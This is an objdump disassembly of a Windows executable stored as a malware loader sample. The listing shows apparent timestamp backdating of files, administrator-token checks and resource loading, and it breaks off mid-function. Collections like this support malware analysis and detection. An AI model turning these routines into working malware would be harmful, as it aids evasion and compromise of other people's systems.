
malware_samples/loader/2e3645c8441f2be4182869db5ae320da00c513e0cb643142c70a833f529f28aa.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	8b 45 08             	mov    0x8(%ebp),%eax
  401006:	68 a0 da 40 00       	push   $0x40daa0
  40100b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40100e:	51                   	push   %ecx
  40100f:	89 45 08             	mov    %eax,0x8(%ebp)
  401012:	e8 48 2b 00 00       	call   0x403b5f
  401017:	cc                   	int3
  401018:	cc                   	int3
  401019:	cc                   	int3
  40101a:	cc                   	int3
  40101b:	cc                   	int3
  40101c:	cc                   	int3
  40101d:	cc                   	int3
  40101e:	cc                   	int3
  40101f:	cc                   	int3
  401020:	55                   	push   %ebp
  401021:	8b ec                	mov    %esp,%ebp
  401023:	8b 45 08             	mov    0x8(%ebp),%eax
  401026:	56                   	push   %esi
  401027:	6a 00                	push   $0x0
  401029:	68 80 00 00 00       	push   $0x80
  40102e:	6a 03                	push   $0x3
  401030:	6a 00                	push   $0x0
  401032:	6a 03                	push   $0x3
  401034:	68 00 00 00 c0       	push   $0xc0000000
  401039:	50                   	push   %eax
  40103a:	ff 15 d8 b0 40 00    	call   *0x40b0d8
  401040:	8b f0                	mov    %eax,%esi
  401042:	83 fe ff             	cmp    $0xffffffff,%esi
  401045:	75 23                	jne    0x40106a
  401047:	8b 45 08             	mov    0x8(%ebp),%eax
  40104a:	83 c0 f0             	add    $0xfffffff0,%eax
  40104d:	8d 48 0c             	lea    0xc(%eax),%ecx
  401050:	0b d6                	or     %esi,%edx
  401052:	f0 0f c1 11          	lock xadd %edx,(%ecx)
  401056:	4a                   	dec    %edx
  401057:	85 d2                	test   %edx,%edx
  401059:	7f 0a                	jg     0x401065
  40105b:	8b 08                	mov    (%eax),%ecx
  40105d:	8b 11                	mov    (%ecx),%edx
  40105f:	50                   	push   %eax
  401060:	8b 42 04             	mov    0x4(%edx),%eax
  401063:	ff d0                	call   *%eax
  401065:	33 c0                	xor    %eax,%eax
  401067:	5e                   	pop    %esi
  401068:	5d                   	pop    %ebp
  401069:	c3                   	ret
  40106a:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40106d:	51                   	push   %ecx
  40106e:	8b d1                	mov    %ecx,%edx
  401070:	52                   	push   %edx
  401071:	8b c1                	mov    %ecx,%eax
  401073:	50                   	push   %eax
  401074:	56                   	push   %esi
  401075:	ff 15 d4 b0 40 00    	call   *0x40b0d4
  40107b:	56                   	push   %esi
  40107c:	ff 15 dc b0 40 00    	call   *0x40b0dc
  401082:	8b 45 08             	mov    0x8(%ebp),%eax
  401085:	83 c0 f0             	add    $0xfffffff0,%eax
  401088:	8d 48 0c             	lea    0xc(%eax),%ecx
  40108b:	83 ca ff             	or     $0xffffffff,%edx
  40108e:	f0 0f c1 11          	lock xadd %edx,(%ecx)
  401092:	4a                   	dec    %edx
  401093:	85 d2                	test   %edx,%edx
  401095:	7f 0a                	jg     0x4010a1
  401097:	8b 08                	mov    (%eax),%ecx
  401099:	8b 11                	mov    (%ecx),%edx
  40109b:	50                   	push   %eax
  40109c:	8b 42 04             	mov    0x4(%edx),%eax
  40109f:	ff d0                	call   *%eax
  4010a1:	b8 01 00 00 00       	mov    $0x1,%eax
  4010a6:	5e                   	pop    %esi
  4010a7:	5d                   	pop    %ebp
  4010a8:	c3                   	ret
  4010a9:	cc                   	int3
  4010aa:	cc                   	int3
  4010ab:	cc                   	int3
  4010ac:	cc                   	int3
  4010ad:	cc                   	int3
  4010ae:	cc                   	int3
  4010af:	cc                   	int3
  4010b0:	55                   	push   %ebp
  4010b1:	8b ec                	mov    %esp,%ebp
  4010b3:	6a ff                	push   $0xffffffff
  4010b5:	68 18 a4 40 00       	push   $0x40a418
  4010ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4010c0:	50                   	push   %eax
  4010c1:	81 ec 80 00 00 00    	sub    $0x80,%esp
  4010c7:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4010cc:	33 c5                	xor    %ebp,%eax
  4010ce:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4010d1:	53                   	push   %ebx
  4010d2:	56                   	push   %esi
  4010d3:	57                   	push   %edi
  4010d4:	50                   	push   %eax
  4010d5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010d8:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4010de:	6a 00                	push   $0x0
  4010e0:	68 00 00 00 02       	push   $0x2000000
  4010e5:	6a 03                	push   $0x3
  4010e7:	6a 00                	push   $0x0
  4010e9:	6a 00                	push   $0x0
  4010eb:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4010f2:	8b 45 08             	mov    0x8(%ebp),%eax
  4010f5:	68 00 00 00 c0       	push   $0xc0000000
  4010fa:	50                   	push   %eax
  4010fb:	ff 15 d8 b0 40 00    	call   *0x40b0d8
  401101:	8b d8                	mov    %eax,%ebx
  401103:	83 fb ff             	cmp    $0xffffffff,%ebx
  401106:	0f 84 20 01 00 00    	je     0x40122c
  40110c:	33 c0                	xor    %eax,%eax
  40110e:	33 c9                	xor    %ecx,%ecx
  401110:	33 d2                	xor    %edx,%edx
  401112:	66 89 4d cc          	mov    %cx,-0x34(%ebp)
  401116:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  401119:	51                   	push   %ecx
  40111a:	66 89 55 ac          	mov    %dx,-0x54(%ebp)
  40111e:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  401124:	89 45 ce             	mov    %eax,-0x32(%ebp)
  401127:	89 45 d2             	mov    %eax,-0x2e(%ebp)
  40112a:	89 45 d6             	mov    %eax,-0x2a(%ebp)
  40112d:	66 89 45 da          	mov    %ax,-0x26(%ebp)
  401131:	89 45 ae             	mov    %eax,-0x52(%ebp)
  401134:	89 45 b2             	mov    %eax,-0x4e(%ebp)
  401137:	89 45 b6             	mov    %eax,-0x4a(%ebp)
  40113a:	66 89 45 ba          	mov    %ax,-0x46(%ebp)
  40113e:	66 89 45 bc          	mov    %ax,-0x44(%ebp)
  401142:	89 45 be             	mov    %eax,-0x42(%ebp)
  401145:	89 45 c2             	mov    %eax,-0x3e(%ebp)
  401148:	89 45 c6             	mov    %eax,-0x3a(%ebp)
  40114b:	66 89 45 ca          	mov    %ax,-0x36(%ebp)
  40114f:	52                   	push   %edx
  401150:	8d 45 84             	lea    -0x7c(%ebp),%eax
  401153:	50                   	push   %eax
  401154:	53                   	push   %ebx
  401155:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  40115b:	8b 35 d0 b0 40 00    	mov    0x40b0d0,%esi
  401161:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  401164:	51                   	push   %ecx
  401165:	8d 55 84             	lea    -0x7c(%ebp),%edx
  401168:	52                   	push   %edx
  401169:	ff d6                	call   *%esi
  40116b:	8b 3d cc b0 40 00    	mov    0x40b0cc,%edi
  401171:	8d 45 cc             	lea    -0x34(%ebp),%eax
  401174:	50                   	push   %eax
  401175:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  401178:	51                   	push   %ecx
  401179:	ff d7                	call   *%edi
  40117b:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40117e:	52                   	push   %edx
  40117f:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  401185:	50                   	push   %eax
  401186:	ff d6                	call   *%esi
  401188:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40118b:	51                   	push   %ecx
  40118c:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40118f:	52                   	push   %edx
  401190:	ff d7                	call   *%edi
  401192:	8d 45 94             	lea    -0x6c(%ebp),%eax
  401195:	50                   	push   %eax
  401196:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  401199:	51                   	push   %ecx
  40119a:	ff d6                	call   *%esi
  40119c:	8d 55 bc             	lea    -0x44(%ebp),%edx
  40119f:	52                   	push   %edx
  4011a0:	8d 45 94             	lea    -0x6c(%ebp),%eax
  4011a3:	50                   	push   %eax
  4011a4:	ff d7                	call   *%edi
  4011a6:	66 8b 4d d4          	mov    -0x2c(%ebp),%cx
  4011aa:	66 8b 55 d6          	mov    -0x2a(%ebp),%dx
  4011ae:	33 c0                	xor    %eax,%eax
  4011b0:	89 45 e2             	mov    %eax,-0x1e(%ebp)
  4011b3:	89 45 e6             	mov    %eax,-0x1a(%ebp)
  4011b6:	89 45 de             	mov    %eax,-0x22(%ebp)
  4011b9:	66 89 45 ea          	mov    %ax,-0x16(%ebp)
  4011bd:	b8 0b 00 00 00       	mov    $0xb,%eax
  4011c2:	66 89 4d e4          	mov    %cx,-0x1c(%ebp)
  4011c6:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  4011cc:	66 89 55 e6          	mov    %dx,-0x1a(%ebp)
  4011d0:	66 89 45 e2          	mov    %ax,-0x1e(%ebp)
  4011d4:	66 8b 45 d8          	mov    -0x28(%ebp),%ax
  4011d8:	51                   	push   %ecx
  4011d9:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4011dc:	52                   	push   %edx
  4011dd:	c7 45 dc d9 07 06 00 	movl   $0x607d9,-0x24(%ebp)
  4011e4:	66 89 45 e8          	mov    %ax,-0x18(%ebp)
  4011e8:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  4011ee:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4011f1:	50                   	push   %eax
  4011f2:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  4011f8:	51                   	push   %ecx
  4011f9:	ff 15 c0 b0 40 00    	call   *0x40b0c0
  4011ff:	53                   	push   %ebx
  401200:	ff 15 dc b0 40 00    	call   *0x40b0dc
  401206:	8b 55 a0             	mov    -0x60(%ebp),%edx
  401209:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40120c:	52                   	push   %edx
  40120d:	50                   	push   %eax
  40120e:	8b 45 08             	mov    0x8(%ebp),%eax
  401211:	51                   	push   %ecx
  401212:	83 c0 f0             	add    $0xfffffff0,%eax
  401215:	89 65 a8             	mov    %esp,-0x58(%ebp)
  401218:	8b f4                	mov    %esp,%esi
  40121a:	e8 71 00 00 00       	call   0x401290
  40121f:	83 c0 10             	add    $0x10,%eax
  401222:	89 06                	mov    %eax,(%esi)
  401224:	e8 f7 fd ff ff       	call   0x401020
  401229:	83 c4 0c             	add    $0xc,%esp
  40122c:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401233:	8b 45 08             	mov    0x8(%ebp),%eax
  401236:	83 c0 f0             	add    $0xfffffff0,%eax
  401239:	83 ca ff             	or     $0xffffffff,%edx
  40123c:	8d 48 0c             	lea    0xc(%eax),%ecx
  40123f:	f0 0f c1 11          	lock xadd %edx,(%ecx)
  401243:	4a                   	dec    %edx
  401244:	85 d2                	test   %edx,%edx
  401246:	7f 0a                	jg     0x401252
  401248:	8b 08                	mov    (%eax),%ecx
  40124a:	8b 11                	mov    (%ecx),%edx
  40124c:	50                   	push   %eax
  40124d:	8b 42 04             	mov    0x4(%edx),%eax
  401250:	ff d0                	call   *%eax
  401252:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401255:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40125c:	59                   	pop    %ecx
  40125d:	5f                   	pop    %edi
  40125e:	5e                   	pop    %esi
  40125f:	5b                   	pop    %ebx
  401260:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401263:	33 cd                	xor    %ebp,%ecx
  401265:	e8 14 1e 00 00       	call   0x40307e
  40126a:	8b e5                	mov    %ebp,%esp
  40126c:	5d                   	pop    %ebp
  40126d:	c3                   	ret
  40126e:	cc                   	int3
  40126f:	cc                   	int3
  401270:	8b 00                	mov    (%eax),%eax
  401272:	83 e8 10             	sub    $0x10,%eax
  401275:	8d 48 0c             	lea    0xc(%eax),%ecx
  401278:	83 ca ff             	or     $0xffffffff,%edx
  40127b:	f0 0f c1 11          	lock xadd %edx,(%ecx)
  40127f:	4a                   	dec    %edx
  401280:	85 d2                	test   %edx,%edx
  401282:	7f 0a                	jg     0x40128e
  401284:	8b 08                	mov    (%eax),%ecx
  401286:	8b 11                	mov    (%ecx),%edx
  401288:	50                   	push   %eax
  401289:	8b 42 04             	mov    0x4(%edx),%eax
  40128c:	ff d0                	call   *%eax
  40128e:	c3                   	ret
  40128f:	cc                   	int3
  401290:	56                   	push   %esi
  401291:	8b f0                	mov    %eax,%esi
  401293:	8b 0e                	mov    (%esi),%ecx
  401295:	8b 01                	mov    (%ecx),%eax
  401297:	8b 50 10             	mov    0x10(%eax),%edx
  40129a:	57                   	push   %edi
  40129b:	ff d2                	call   *%edx
  40129d:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  4012a1:	8d 4e 0c             	lea    0xc(%esi),%ecx
  4012a4:	7c 14                	jl     0x4012ba
  4012a6:	3b 06                	cmp    (%esi),%eax
  4012a8:	75 10                	jne    0x4012ba
  4012aa:	8b fe                	mov    %esi,%edi
  4012ac:	b8 01 00 00 00       	mov    $0x1,%eax
  4012b1:	f0 0f c1 01          	lock xadd %eax,(%ecx)
  4012b5:	8b c7                	mov    %edi,%eax
  4012b7:	5f                   	pop    %edi
  4012b8:	5e                   	pop    %esi
  4012b9:	c3                   	ret
  4012ba:	8b 4e 04             	mov    0x4(%esi),%ecx
  4012bd:	8b 10                	mov    (%eax),%edx
  4012bf:	8b 12                	mov    (%edx),%edx
  4012c1:	6a 02                	push   $0x2
  4012c3:	51                   	push   %ecx
  4012c4:	8b c8                	mov    %eax,%ecx
  4012c6:	ff d2                	call   *%edx
  4012c8:	8b f8                	mov    %eax,%edi
  4012ca:	85 ff                	test   %edi,%edi
  4012cc:	75 05                	jne    0x4012d3
  4012ce:	e8 2d 00 00 00       	call   0x401300
  4012d3:	8b 46 04             	mov    0x4(%esi),%eax
  4012d6:	89 47 04             	mov    %eax,0x4(%edi)
  4012d9:	8b 46 04             	mov    0x4(%esi),%eax
  4012dc:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  4012e0:	50                   	push   %eax
  4012e1:	83 c6 10             	add    $0x10,%esi
  4012e4:	56                   	push   %esi
  4012e5:	50                   	push   %eax
  4012e6:	8d 4f 10             	lea    0x10(%edi),%ecx
  4012e9:	51                   	push   %ecx
  4012ea:	e8 9e 1d 00 00       	call   0x40308d
  4012ef:	83 c4 10             	add    $0x10,%esp
  4012f2:	8b c7                	mov    %edi,%eax
  4012f4:	5f                   	pop    %edi
  4012f5:	5e                   	pop    %esi
  4012f6:	c3                   	ret
  4012f7:	cc                   	int3
  4012f8:	cc                   	int3
  4012f9:	cc                   	int3
  4012fa:	cc                   	int3
  4012fb:	cc                   	int3
  4012fc:	cc                   	int3
  4012fd:	cc                   	int3
  4012fe:	cc                   	int3
  4012ff:	cc                   	int3
  401300:	68 0e 00 07 80       	push   $0x8007000e
  401305:	e8 f6 fc ff ff       	call   0x401000
  40130a:	cc                   	int3
  40130b:	cc                   	int3
  40130c:	cc                   	int3
  40130d:	cc                   	int3
  40130e:	cc                   	int3
  40130f:	cc                   	int3
  401310:	55                   	push   %ebp
  401311:	8b ec                	mov    %esp,%ebp
  401313:	81 ec 70 01 00 00    	sub    $0x170,%esp
  401319:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  40131e:	33 c5                	xor    %ebp,%eax
  401320:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401323:	56                   	push   %esi
  401324:	57                   	push   %edi
  401325:	33 ff                	xor    %edi,%edi
  401327:	68 10 01 00 00       	push   $0x110
  40132c:	8d 85 a8 fe ff ff    	lea    -0x158(%ebp),%eax
  401332:	57                   	push   %edi
  401333:	50                   	push   %eax
  401334:	89 bd 94 fe ff ff    	mov    %edi,-0x16c(%ebp)
  40133a:	89 bd 9c fe ff ff    	mov    %edi,-0x164(%ebp)
  401340:	89 bd a0 fe ff ff    	mov    %edi,-0x160(%ebp)
  401346:	89 bd 98 fe ff ff    	mov    %edi,-0x168(%ebp)
  40134c:	e8 9f 28 00 00       	call   0x403bf0
  401351:	83 c4 0c             	add    $0xc,%esp
  401354:	8d 8d 9c fe ff ff    	lea    -0x164(%ebp),%ecx
  40135a:	51                   	push   %ecx
  40135b:	6a 0a                	push   $0xa
  40135d:	c7 85 a4 fe ff ff 14 	movl   $0x114,-0x15c(%ebp)
  401364:	01 00 00 
  401367:	ff 15 bc b0 40 00    	call   *0x40b0bc
  40136d:	50                   	push   %eax
  40136e:	ff 15 20 b0 40 00    	call   *0x40b020
  401374:	85 c0                	test   %eax,%eax
  401376:	0f 84 cb 00 00 00    	je     0x401447
  40137c:	8d 95 a4 fe ff ff    	lea    -0x15c(%ebp),%edx
  401382:	52                   	push   %edx
  401383:	ff 15 b8 b0 40 00    	call   *0x40b0b8
  401389:	85 c0                	test   %eax,%eax
  40138b:	0f 84 b6 00 00 00    	je     0x401447
  401391:	83 bd a8 fe ff ff 06 	cmpl   $0x6,-0x158(%ebp)
  401398:	72 51                	jb     0x4013eb
  40139a:	8b 95 9c fe ff ff    	mov    -0x164(%ebp),%edx
  4013a0:	8b 35 1c b0 40 00    	mov    0x40b01c,%esi
  4013a6:	8d 85 98 fe ff ff    	lea    -0x168(%ebp),%eax
  4013ac:	50                   	push   %eax
  4013ad:	6a 04                	push   $0x4
  4013af:	8d 8d 90 fe ff ff    	lea    -0x170(%ebp),%ecx
  4013b5:	51                   	push   %ecx
  4013b6:	6a 12                	push   $0x12
  4013b8:	52                   	push   %edx
  4013b9:	ff d6                	call   *%esi
  4013bb:	85 c0                	test   %eax,%eax
  4013bd:	0f 84 84 00 00 00    	je     0x401447
  4013c3:	83 bd 90 fe ff ff 03 	cmpl   $0x3,-0x170(%ebp)
  4013ca:	75 1f                	jne    0x4013eb
  4013cc:	8b 95 9c fe ff ff    	mov    -0x164(%ebp),%edx
  4013d2:	8d 85 98 fe ff ff    	lea    -0x168(%ebp),%eax
  4013d8:	50                   	push   %eax
  4013d9:	6a 04                	push   $0x4
  4013db:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  4013e1:	51                   	push   %ecx
  4013e2:	6a 13                	push   $0x13
  4013e4:	52                   	push   %edx
  4013e5:	ff d6                	call   *%esi
  4013e7:	85 c0                	test   %eax,%eax
  4013e9:	74 5c                	je     0x401447
  4013eb:	39 bd a0 fe ff ff    	cmp    %edi,-0x160(%ebp)
  4013f1:	75 1a                	jne    0x40140d
  4013f3:	8b 8d 9c fe ff ff    	mov    -0x164(%ebp),%ecx
  4013f9:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  4013ff:	50                   	push   %eax
  401400:	6a 01                	push   $0x1
  401402:	51                   	push   %ecx
  401403:	ff 15 18 b0 40 00    	call   *0x40b018
  401409:	85 c0                	test   %eax,%eax
  40140b:	74 3a                	je     0x401447
  40140d:	8d 95 98 fe ff ff    	lea    -0x168(%ebp),%edx
  401413:	52                   	push   %edx
  401414:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401417:	50                   	push   %eax
  401418:	57                   	push   %edi
  401419:	6a 1a                	push   $0x1a
  40141b:	c7 85 98 fe ff ff 44 	movl   $0x44,-0x168(%ebp)
  401422:	00 00 00 
  401425:	ff 15 14 b0 40 00    	call   *0x40b014
  40142b:	85 c0                	test   %eax,%eax
  40142d:	74 18                	je     0x401447
  40142f:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  401435:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  40143b:	51                   	push   %ecx
  40143c:	8d 55 b8             	lea    -0x48(%ebp),%edx
  40143f:	52                   	push   %edx
  401440:	50                   	push   %eax
  401441:	ff 15 28 b0 40 00    	call   *0x40b028
  401447:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40144d:	8b 35 dc b0 40 00    	mov    0x40b0dc,%esi
  401453:	3b c7                	cmp    %edi,%eax
  401455:	74 03                	je     0x40145a
  401457:	50                   	push   %eax
  401458:	ff d6                	call   *%esi
  40145a:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  401460:	3b c7                	cmp    %edi,%eax
  401462:	74 03                	je     0x401467
  401464:	50                   	push   %eax
  401465:	ff d6                	call   *%esi
  401467:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40146a:	8b 85 94 fe ff ff    	mov    -0x16c(%ebp),%eax
  401470:	5f                   	pop    %edi
  401471:	33 cd                	xor    %ebp,%ecx
  401473:	5e                   	pop    %esi
  401474:	e8 05 1c 00 00       	call   0x40307e
  401479:	8b e5                	mov    %ebp,%esp
  40147b:	5d                   	pop    %ebp
  40147c:	c3                   	ret
  40147d:	cc                   	int3
  40147e:	cc                   	int3
  40147f:	cc                   	int3
  401480:	c7 01 a8 b2 40 00    	movl   $0x40b2a8,(%ecx)
  401486:	e9 ac 1d 00 00       	jmp    0x403237
  40148b:	cc                   	int3
  40148c:	cc                   	int3
  40148d:	cc                   	int3
  40148e:	cc                   	int3
  40148f:	cc                   	int3
  401490:	55                   	push   %ebp
  401491:	8b ec                	mov    %esp,%ebp
  401493:	56                   	push   %esi
  401494:	8b f1                	mov    %ecx,%esi
  401496:	c7 06 a8 b2 40 00    	movl   $0x40b2a8,(%esi)
  40149c:	e8 96 1d 00 00       	call   0x403237
  4014a1:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4014a5:	74 09                	je     0x4014b0
  4014a7:	56                   	push   %esi
  4014a8:	e8 c6 1b 00 00       	call   0x403073
  4014ad:	83 c4 04             	add    $0x4,%esp
  4014b0:	8b c6                	mov    %esi,%eax
  4014b2:	5e                   	pop    %esi
  4014b3:	5d                   	pop    %ebp
  4014b4:	c2 04 00             	ret    $0x4
  4014b7:	cc                   	int3
  4014b8:	cc                   	int3
  4014b9:	cc                   	int3
  4014ba:	cc                   	int3
  4014bb:	cc                   	int3
  4014bc:	cc                   	int3
  4014bd:	cc                   	int3
  4014be:	cc                   	int3
  4014bf:	cc                   	int3
  4014c0:	55                   	push   %ebp
  4014c1:	8b ec                	mov    %esp,%ebp
  4014c3:	57                   	push   %edi
  4014c4:	8b f8                	mov    %eax,%edi
  4014c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4014c9:	53                   	push   %ebx
  4014ca:	50                   	push   %eax
  4014cb:	ff 15 6c b0 40 00    	call   *0x40b06c
  4014d1:	85 c0                	test   %eax,%eax
  4014d3:	75 03                	jne    0x4014d8
  4014d5:	5f                   	pop    %edi
  4014d6:	5d                   	pop    %ebp
  4014d7:	c3                   	ret
  4014d8:	56                   	push   %esi
  4014d9:	50                   	push   %eax
  4014da:	ff 15 34 b0 40 00    	call   *0x40b034
  4014e0:	8b f0                	mov    %eax,%esi
  4014e2:	85 f6                	test   %esi,%esi
  4014e4:	74 24                	je     0x40150a
  4014e6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4014e9:	53                   	push   %ebx
  4014ea:	51                   	push   %ecx
  4014eb:	ff 15 38 b0 40 00    	call   *0x40b038
  4014f1:	03 c6                	add    %esi,%eax
  4014f3:	83 e7 0f             	and    $0xf,%edi
  4014f6:	76 0e                	jbe    0x401506
  4014f8:	3b f0                	cmp    %eax,%esi
  4014fa:	73 0e                	jae    0x40150a
  4014fc:	4f                   	dec    %edi
  4014fd:	0f b7 16             	movzwl (%esi),%edx
  401500:	8d 74 56 02          	lea    0x2(%esi,%edx,2),%esi
  401504:	75 f2                	jne    0x4014f8
  401506:	3b f0                	cmp    %eax,%esi
  401508:	72 06                	jb     0x401510
  40150a:	5e                   	pop    %esi
  40150b:	33 c0                	xor    %eax,%eax
  40150d:	5f                   	pop    %edi
  40150e:	5d                   	pop    %ebp
  40150f:	c3                   	ret
  401510:	0f b7 06             	movzwl (%esi),%eax
  401513:	f7 d8                	neg    %eax
  401515:	1b c0                	sbb    %eax,%eax
  401517:	23 c6                	and    %esi,%eax
  401519:	5e                   	pop    %esi
  40151a:	5f                   	pop    %edi
  40151b:	5d                   	pop    %ebp
  40151c:	c3                   	ret
  40151d:	cc                   	int3
  40151e:	cc                   	int3
  40151f:	cc                   	int3
  401520:	55                   	push   %ebp
  401521:	8b ec                	mov    %esp,%ebp
  401523:	51                   	push   %ecx
  401524:	53                   	push   %ebx
  401525:	56                   	push   %esi
  401526:	57                   	push   %edi
  401527:	33 f6                	xor    %esi,%esi
  401529:	56                   	push   %esi
  40152a:	b9 e0 07 41 00       	mov    $0x4107e0,%ecx
  40152f:	e8 97 18 00 00       	call   0x402dcb
  401534:	8b d8                	mov    %eax,%ebx
  401536:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40153d:	85 db                	test   %ebx,%ebx
  40153f:	0f 84 8f 00 00 00    	je     0x4015d4
  401545:	85 f6                	test   %esi,%esi
  401547:	0f 85 87 00 00 00    	jne    0x4015d4
  40154d:	8b 45 08             	mov    0x8(%ebp),%eax
  401550:	c1 e8 04             	shr    $0x4,%eax
  401553:	40                   	inc    %eax
  401554:	56                   	push   %esi
  401555:	0f b7 c8             	movzwl %ax,%ecx
  401558:	51                   	push   %ecx
  401559:	6a 06                	push   $0x6
  40155b:	53                   	push   %ebx
  40155c:	ff 15 40 b0 40 00    	call   *0x40b040
  401562:	8b f8                	mov    %eax,%edi
  401564:	85 ff                	test   %edi,%edi
  401566:	74 50                	je     0x4015b8
  401568:	57                   	push   %edi
  401569:	53                   	push   %ebx
  40156a:	ff 15 6c b0 40 00    	call   *0x40b06c
  401570:	85 c0                	test   %eax,%eax
  401572:	74 3e                	je     0x4015b2
  401574:	50                   	push   %eax
  401575:	ff 15 34 b0 40 00    	call   *0x40b034
  40157b:	8b f0                	mov    %eax,%esi
  40157d:	85 f6                	test   %esi,%esi
  40157f:	74 31                	je     0x4015b2
  401581:	57                   	push   %edi
  401582:	53                   	push   %ebx
  401583:	ff 15 38 b0 40 00    	call   *0x40b038
  401589:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40158c:	03 c6                	add    %esi,%eax
  40158e:	83 e1 0f             	and    $0xf,%ecx
  401591:	76 0e                	jbe    0x4015a1
  401593:	3b f0                	cmp    %eax,%esi
  401595:	73 0e                	jae    0x4015a5
  401597:	49                   	dec    %ecx
  401598:	0f b7 16             	movzwl (%esi),%edx
  40159b:	8d 74 56 02          	lea    0x2(%esi,%edx,2),%esi
  40159f:	75 f2                	jne    0x401593
  4015a1:	3b f0                	cmp    %eax,%esi
  4015a3:	72 04                	jb     0x4015a9
  4015a5:	33 c0                	xor    %eax,%eax
  4015a7:	eb 09                	jmp    0x4015b2
  4015a9:	0f b7 06             	movzwl (%esi),%eax
  4015ac:	f7 d8                	neg    %eax
  4015ae:	1b c0                	sbb    %eax,%eax
  4015b0:	23 c6                	and    %esi,%eax
  4015b2:	8b f0                	mov    %eax,%esi
  4015b4:	85 c0                	test   %eax,%eax
  4015b6:	75 25                	jne    0x4015dd
  4015b8:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4015bb:	57                   	push   %edi
  4015bc:	b9 e0 07 41 00       	mov    $0x4107e0,%ecx
  4015c1:	e8 05 18 00 00       	call   0x402dcb
  4015c6:	8b d8                	mov    %eax,%ebx
  4015c8:	47                   	inc    %edi
  4015c9:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4015cc:	85 db                	test   %ebx,%ebx
  4015ce:	0f 85 71 ff ff ff    	jne    0x401545
  4015d4:	5f                   	pop    %edi
  4015d5:	5e                   	pop    %esi
  4015d6:	33 c0                	xor    %eax,%eax
  4015d8:	5b                   	pop    %ebx
  4015d9:	8b e5                	mov    %ebp,%esp
  4015db:	5d                   	pop    %ebp
  4015dc:	c3                   	ret
  4015dd:	5f                   	pop    %edi
  4015de:	5e                   	pop    %esi
  4015df:	8b c3                	mov    %ebx,%eax
  4015e1:	5b                   	pop    %ebx
  4015e2:	8b e5                	mov    %ebp,%esp
  4015e4:	5d                   	pop    %ebp
  4015e5:	c3                   	ret
  4015e6:	cc                   	int3
  4015e7:	cc                   	int3
  4015e8:	cc                   	int3
  4015e9:	cc                   	int3
  4015ea:	cc                   	int3
  4015eb:	cc                   	int3
  4015ec:	cc                   	int3
  4015ed:	cc                   	int3
  4015ee:	cc                   	int3
  4015ef:	cc                   	int3
  4015f0:	55                   	push   %ebp
  4015f1:	8b ec                	mov    %esp,%ebp
  4015f3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4015f6:	75 18                	jne    0x401610
  4015f8:	8b c6                	mov    %esi,%eax
  4015fa:	8d 50 02             	lea    0x2(%eax),%edx
  4015fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  401600:	66 8b 08             	mov    (%eax),%cx
  401603:	83 c0 02             	add    $0x2,%eax
  401606:	66 85 c9             	test   %cx,%cx
  401609:	75 f5                	jne    0x401600
  40160b:	2b c2                	sub    %edx,%eax
  40160d:	d1 f8                	sar    $1,%eax
  40160f:	40                   	inc    %eax
  401610:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401613:	50                   	push   %eax
  401614:	8b 45 0c             	mov    0xc(%ebp),%eax
  401617:	56                   	push   %esi
  401618:	50                   	push   %eax
  401619:	51                   	push   %ecx
  40161a:	e8 a6 1c 00 00       	call   0x4032c5
  40161f:	83 c4 10             	add    $0x10,%esp
  401622:	83 f8 50             	cmp    $0x50,%eax
  401625:	77 22                	ja     0x401649
  401627:	0f b6 90 68 16 40 00 	movzbl 0x401668(%eax),%edx
  40162e:	ff 24 95 58 16 40 00 	jmp    *0x401658(,%edx,4)
  401635:	68 0e 00 07 80       	push   $0x8007000e
  40163a:	e8 c1 f9 ff ff       	call   0x401000
